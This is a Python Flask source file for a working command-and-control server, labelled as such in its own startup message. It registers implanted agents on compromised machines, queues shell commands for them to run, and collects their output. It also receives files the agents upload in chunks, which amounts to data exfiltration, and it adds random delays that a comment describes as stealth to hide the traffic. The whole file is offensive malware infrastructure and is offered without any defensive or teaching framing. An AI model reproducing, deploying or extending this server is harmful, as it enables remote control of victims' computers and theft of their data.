from flask import Flask, request, jsonify, render_template, send_from_directory
import os
import base64
import json
import threading
import time
import random
from datetime import datetime
from pathlib import Path

app = Flask(__name__)
UPLOAD_DIR = Path('uploads')
UPLOAD_DIR.mkdir(exist_ok=True)
STATE_FILE = Path('c2_state.json')
lock = threading.RLock()

# Rate limiting for stealth (mimics sluggish web app / CDN)
RATE_LIMIT = True
RATE_LIMIT_BASE = 0.05       # minimum artificial latency (seconds)
RATE_LIMIT_JITTER = 0.35     # max additional random latency
UPLOAD_CHUNK_DELAY = 0.15    # extra per-chunk delay to spread upload traffic

state = {
    'agents': {},
    'commands': {},
    'uploads': {},
}

def save_state():
    with lock:
        with open(STATE_FILE, 'w', encoding='utf-8') as f:
            json.dump(state, f, default=str, indent=2)

def load_state():
    global state
    if STATE_FILE.exists():
        try:
            with open(STATE_FILE, 'r', encoding='utf-8') as f:
                loaded = json.load(f)
                for k in ['agents', 'commands', 'uploads']:
                    if k not in loaded:
                        loaded[k] = {}
                state = loaded
        except Exception as e:
            print(f'State load error: {e}')

@app.after_request
def apply_rate_limit(response):
    if RATE_LIMIT and request.method == 'POST':
        delay = RATE_LIMIT_BASE + random.random() * RATE_LIMIT_JITTER
        if '/upload_chunk' in request.path:
            delay += UPLOAD_CHUNK_DELAY
        time.sleep(delay)
    return response

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/agents')
def api_agents():
    with lock:
        return jsonify(state['agents'])

@app.route('/api/agents/<guid>/command', methods=['POST'])
def api_command(guid):
    data = request.get_json() or {}
    cmd = data.get('cmd', '').strip()
    if not cmd:
        return jsonify({'error': 'empty command'}), 400
    with lock:
        seqs = state['commands'].get(guid, [])
        next_seq = max([c[0] for c in seqs] + [0]) + 1
        seqs.append([next_seq, cmd, 'pending', '', ''])
        state['commands'][guid] = seqs
        if guid not in state['agents']:
            state['agents'][guid] = {
                'guid': guid, 'hostname': 'unknown', 'username': 'unknown',
                'last_seen': None, 'output_lines': []
            }
    save_state()
    return jsonify({'seq': next_seq, 'status': 'queued'})

@app.route('/api/agents/<guid>/output')
def api_output(guid):
    with lock:
        return jsonify(state['commands'].get(guid, []))

@app.route('/api/files')
def api_files():
    with lock:
        files = []
        for k, v in state['uploads'].items():
            entry = dict(v)
            entry['key'] = k
            files.append(entry)
        return jsonify(files)

@app.route('/api/download/<guid>/<path:filename>')
def api_download(guid, filename):
    upload_dir = UPLOAD_DIR / guid
    if not upload_dir.exists():
        return jsonify({'error': 'not found'}), 404
    safe_name = Path(filename).name
    target = upload_dir / safe_name
    if not target.exists():
        return jsonify({'error': 'file not found'}), 404
    return send_from_directory(str(upload_dir), safe_name, as_attachment=True)

@app.route('/beacon', methods=['POST'])
def beacon():
    data = request.get_data(as_text=True)
    with open("beacon.log","a",encoding="utf-8") as lf: lf.write("[BEACON] "+data+chr(10))
    try:
        j = json.loads(data)
    except Exception:
        return jsonify({})

    guid = j.get('guid', 'unknown')
    hostname = j.get('hostname', 'unknown')
    username = j.get('username', 'unknown')
    result_b64 = j.get('result_b64', '')
    seq_str = j.get('seq', '0')
    try:
        seq_num = int(seq_str)
    except Exception:
        seq_num = 0

    result = ''
    if result_b64:
        try:
            result = base64.b64decode(result_b64).decode('utf-8', errors='replace')
        except Exception:
            result = '[decode error]'

    with lock:
        if guid not in state['agents']:
            state['agents'][guid] = {
                'guid': guid, 'hostname': hostname, 'username': username,
                'last_seen': None, 'output_lines': []
            }
        agent = state['agents'][guid]
        agent['last_seen'] = datetime.now().isoformat()
        agent['hostname'] = hostname
        agent['username'] = username

        if result and seq_num > 0:
            cmds = state['commands'].get(guid, [])
            for c in cmds:
                if c[0] == seq_num and c[2] == 'pending':
                    c[2] = 'completed'
                    c[3] = result
                    c[4] = datetime.now().isoformat()
                    break

        for c in state['commands'].get(guid, []):
            if c[0] > seq_num:
                save_state()
                return jsonify({"cmd": c[1], "seq": str(c[0])})

    save_state()
    return jsonify({})

@app.route('/upload_init', methods=['POST'])
def upload_init():
    print(f"[UPLOAD_INIT] {request.get_data(as_text=True)}")
    data = request.get_json() or {}
    guid = data.get('guid', 'unknown')
    filename = data.get('filename', 'unknown')
    total_size = data.get('total_size', 0)

    safe_name = Path(filename).name
    key = f'{guid}/{safe_name}'
    upload_dir = UPLOAD_DIR / guid
    upload_dir.mkdir(parents=True, exist_ok=True)
    filepath = upload_dir / safe_name

    with lock:
        if key not in state['uploads']:
            state['uploads'][key] = {
                'guid': guid,
                'filename': filename,
                'total_size': total_size,
                'received': 0,
                'path': str(filepath),
                'status': 'uploading'
            }
        offset = state['uploads'][key]['received']

    save_state()
    return jsonify({'status': 'ok', 'offset': str(offset)})

@app.route('/upload_chunk', methods=['POST'])
def upload_chunk():
    print(f"[UPLOAD_CHUNK] {request.get_data(as_text=True)[:200]}")
    data = request.get_json() or {}
    guid = data.get('guid', 'unknown')
    filename = data.get('filename', 'unknown')
    offset = data.get('offset', 0)
    chunk_b64 = data.get('chunk_b64', '')

    safe_name = Path(filename).name
    key = f'{guid}/{safe_name}'
    with lock:
        upload = state['uploads'].get(key)
        if not upload:
            return jsonify({'status': 'error', 'msg': 'upload not initialized'})

        filepath = Path(upload['path'])
        filepath.parent.mkdir(parents=True, exist_ok=True)

        try:
            chunk = base64.b64decode(chunk_b64)
        except Exception:
            return jsonify({'status': 'error', 'msg': 'bad base64'})

        if not filepath.exists():
            filepath.write_bytes(b'')
        with open(filepath, 'r+b') as f:
            f.seek(offset)
            f.write(chunk)
            if offset + len(chunk) >= upload['total_size']:
                f.truncate(offset + len(chunk))

        upload['received'] = max(upload['received'], offset + len(chunk))
        if upload['received'] >= upload['total_size']:
            upload['status'] = 'completed'

    save_state()
    return jsonify({'status': 'ok'})

if __name__ == '__main__':
    load_state()
    print('C2 Server starting on http://0.0.0.0:8443')
    app.run(host='0.0.0.0', port=8443, threaded=True)

